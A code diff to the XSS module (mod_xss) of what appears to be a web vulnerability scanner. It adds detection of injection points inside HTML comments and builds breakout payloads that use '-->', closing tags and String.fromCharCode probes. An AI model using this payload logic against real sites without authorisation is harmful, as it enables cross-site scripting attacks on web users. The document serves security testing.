@@ -509,6 +509,12 @@ class mod_xss(Attack):
                 # recursively search injection points for the same variable
                 for x in bs_node.contents:
                     self.study(x, parent=bs_node, keyword=keyword, entries=entries)
+            elif isinstance(bs_node, element.Comment):
+                # print("Found in comment, tag {0}".format(parent.name))
+                noscript = self.closeNoscript(bs_node)
+                d = {"type": "comment", "parent": parent.name, "noscript": noscript}
+                if d not in entries:
+                    entries.append(d)
             elif isinstance(bs_node, element.NavigableString):
                 # print("Found in text, tag {0}".format(parent.name))
                 noscript = self.closeNoscript(bs_node)
@@ -608,6 +614,26 @@ class mod_xss(Attack):
                 elif elem['parent'] == "script":  # Control over the body of a script :)
                     # Just check if we can use brackets
                     js_code = "String.fromCharCode(0,__XSS__,1)".replace("__XSS__", code)
+                    if js_code not in payloads:
+                        payloads.insert(0, js_code)
+
+                for xss in self.independant_payloads:
+                    js_code = payload + xss.replace("__XSS__", code)
+                    if js_code not in payloads:
+                        payloads.append(js_code)
+
+            # Injection occurred in a comment tag
+            # ex: <!-- <div> whatever our_string blablah </div> -->
+            elif elem['type'] == "comment":
+                payload = "-->"
+                if elem['parent'] in ["title", "textarea"]:  # we can't execute javascript in those tags
+                    if elem['noscript'] != "":
+                        payload += elem['noscript']
+                    else:
+                        payload += "</{0}>".format(elem['parent'])
+                elif elem['parent'] == "script":  # Control over the body of a script :)
+                    # Just check if we can use brackets
+                    js_code = payload + "String.fromCharCode(0,__XSS__,1)".replace("__XSS__", code)
                     if js_code not in payloads:
                         payloads.insert(0, js_code)
 
